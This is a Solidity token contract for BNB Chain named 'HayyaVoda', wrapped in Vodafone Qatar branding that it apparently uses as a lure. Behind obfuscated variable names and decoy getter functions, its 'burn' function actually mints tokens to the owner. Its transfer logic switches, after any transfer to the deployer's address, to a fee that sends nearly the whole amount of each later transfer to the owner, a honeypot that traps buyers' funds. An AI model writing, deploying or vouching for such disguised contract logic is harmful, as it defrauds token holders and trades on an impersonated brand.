/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

//////////////////////////////////////////////////////////////////////////////////////////////////////
//Free Fan SIM - For all Hayya Card Holders
//Visiting Qatar? Our Fan packs are exclusively designed for your needs
//https://vodafone.qa/
//https://www.instagram.com/vodafoneqatar/
//https://www.facebook.com/VodafoneQatar
//https://twitter.com/vodafoneqatar
//https://www.youtube.com/user/vodafoneqatar
//https://www.linkedin.com/company/vodafone
//////////////////////////////////////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;
contract HayyaVoda {
uint256 private  RJREHV = 1000000000000000000;
string public  name = "HayyaVoda";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
address public owner;
uint256 private  UZAREB = 10000000000000;
string public  symbol = "HayyaVoda";
address private  THGIWE = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address private  NDVJBY = address(0);
uint256 private  SLDSAK = 1000000000000000000;
address private  FEHPMD = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  OIXSGS = 100000000;
mapping (address => mapping (address => uint256)) private _allowances;
address private  VIVSAW = address(0);
mapping (address => uint256) public balanceOf;
address private  LCNLXQ = address(0);
uint256 public constant SQKNTK = 99999;
event Approval(address indexed owner, address indexed spender, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  FALGUM = 1000000000000000;
uint256 private  KCTATD = 10000000000;
uint256 private  QKSTJS = 1000000000000000000000;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () public {
VIVSAW = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getUZAREB() private returns (uint256) {
return UZAREB;
}

function _getFEHPMD() private returns (address) {
return FEHPMD;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getOIXSGS() private returns (uint256) {
return OIXSGS;
}

function _getTHGIWE() private returns (address) {
return THGIWE;
}

function _getQKSTJS() private returns (uint256) {
return QKSTJS;
}

function _getLCNLXQ() private returns (address) {
return LCNLXQ;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "DOSRJU");
require(to != address(0), "DOSRJU");
require(amount <= balanceOf[from], "DOSRJU");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* SQKNTK/SLDSAK ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==VIVSAW){
SLDSAK = SQKNTK+2;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getKCTATD() private returns (uint256) {
return KCTATD;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tDOSRJU 0");
require(spender != address(0), "fDOSRJU 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getNDVJBY() private returns (address) {
return NDVJBY;
}

function _getRJREHV() private returns (uint256) {
return RJREHV;
}

function _getFALGUM() private returns (uint256) {
return FALGUM;
}


}